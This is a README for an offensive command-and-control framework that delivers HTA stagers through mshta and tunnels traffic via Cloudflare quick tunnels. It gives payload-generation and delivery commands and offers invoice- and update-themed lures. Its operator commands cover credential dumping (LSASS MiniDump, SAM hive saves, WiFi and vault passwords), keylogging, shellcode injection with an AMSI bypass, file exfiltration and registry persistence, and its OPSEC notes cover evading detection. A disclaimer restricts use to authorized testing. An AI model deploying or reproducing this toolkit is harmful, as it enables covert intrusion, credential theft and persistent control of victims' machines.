# cf-hta — Cloudflare-tunneled HTA C2

A lightweight command-and-control framework using HTA (HTML Application) as the initial access stager, with all traffic tunneled through Cloudflare's free `trycloudflare.com` tunnels. No infrastructure setup required.

```
mshta.exe payload.hta
        │
        ▼
Cloudflare tunnel (trycloudflare.com)
        │
        ▼
Flask C2 server (localhost:8080)
        │
        ▼
Operator CLI (interactive)
```

## ⚠️ DISCLAIMER

**This tool is provided for authorized penetration testing, red team engagements, and security research purposes ONLY.**

- You **must** have **explicit written authorization** from the system owner before deploying this tool.
- Unauthorized use against systems you do not own or have permission to test is **illegal** and may result in criminal prosecution under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation in your jurisdiction.
- The author(s) assume **no liability** for misuse of this tool.
- This tool is intended for use by professional penetration testers, red teamers, and security researchers in controlled environments.

**Use responsibly. Test only what you own or have permission to test.**

---

## Features

- **No persistent infrastructure** — uses free Cloudflare Quick Tunnels (`trycloudflare.com`)
- **HTA stager** — JScript-only, no PowerShell spawn from mshta (parent: `WmiPrvSE.exe`)
- **XOR+Base64 encrypted comms** — configurable key per engagement
- **Interactive operator CLI** — shell, recon, creds, keylogger, file ops, persistence
- **Auto-recon on first check-in** — 16 commands sent automatically on beacon
- **No Mimikatz binary** — credential dumping via `comsvcs.dll` LOLBin + `reg save`

## Requirements

```
Python 3.10+
Flask
cloudflared (Cloudflare tunnel binary)
```

## Quick Start

```bash
# 1. Install dependencies
pip install flask

# 2. Start the tunnel (get the URL from output)
cloudflared tunnel --url http://localhost:8080

# 3. Generate payload (use the tunnel URL from step 2)
python3 gen.py https://xxxx-yyyy.trycloudflare.com --key $(openssl rand -hex 16) --out payload.hta

# 4. Start the C2 server (use same --key as gen.py)
python3 server.py --key <your_hex_key>

# 5. Deliver payload.hta to target (authorized target only)
#    mshta.exe payload.hta
```

Or use the automated setup script:

```bash
chmod +x setup.sh && ./setup.sh
```

## Operator CLI Commands

```
── Shell / Execution ──────────────────────────────────────────────────────────
  sh      <id> <cmd>            CMD shell (WMI parent=WmiPrvSE, no mshta→cmd)
  ps      <id> <code>           PowerShell via temp .ps1 (WMI, no -EncodedCommand)
  inject  <id> <pid> <sc.bin>   Process inject shellcode (inline C#, AMSI bypass)

── Recon ──────────────────────────────────────────────────────────────────────
  recon   <id>                  Full recon dump (16 cmds: whoami, ipconfig, ARP, users, procs, disks, domain, ...)
  sc      <id>                  Screenshot (PNG saved to ./screens/)
  clip    <id>                  Clipboard contents
  env     <id>                  Environment variables
  plist   <id>                  Process list
  arp     <id>                  ARP table
  net     <id>                  ipconfig /all

── Credentials ────────────────────────────────────────────────────────────────
  wifipass  <id>                WiFi saved passwords (netsh LOLBin)
  cmdkeys   <id>                Windows Credential Manager (cmdkey /list)
  vault     <id>                Windows Vault credentials
  hivesave  <id>                reg save SAM+SYSTEM+SECURITY → auto-download
  lsadump   <id>                comsvcs.dll MiniDump → auto-download → pypykatz hint

── Keylogger ──────────────────────────────────────────────────────────────────
  klog    <id> [secs=30]        PS GetAsyncKeyState keylogger for N seconds

── Files ──────────────────────────────────────────────────────────────────────
  dl      <id> <remote_path>    Download file from victim
  ul      <id> <local> <remote> Upload file to victim

── Persistence ────────────────────────────────────────────────────────────────
  persist <id> <name> <cmd>     HKCU\Run registry key
  spawn   <id>                  Copy HTA to AppData + HKCU Run

── Management ─────────────────────────────────────────────────────────────────
  agents                        List active agents
  use     <id>                  Set default agent (short prefix ok)
  results [id]                  Last 10 stored results
  kill    <id>                  Terminate agent
```

## Payload Options

```bash
python3 gen.py <tunnel_url> [options]

Options:
  --key   HEX    XOR key (default: random 16 bytes)
  --out   FILE   Output filename (default: payload.hta)
  --lure  TYPE   Lure type: update (default), error, invoice, pdf
```

## Architecture

```
gen.py          Payload generator — embeds C2 URL + XOR key into HTA template
server.py       Flask C2 server + interactive operator CLI
payload.hta     Generated HTA stager (JScript, no VBScript)
screens/        Screenshot storage
```

## OPSEC Notes

- Each engagement should use a unique `--key`
- The HTA window is minimized and moved offscreen on load
- Beacon jitter: 30–120s idle, 2s after task execution
- All comms are JSON over HTTPS (Cloudflare TLS)
- WMI process creation breaks the `mshta.exe → cmd.exe` parent chain

## License

MIT License — see [LICENSE](LICENSE)

**Again: authorized use only. The author is not responsible for misuse.**
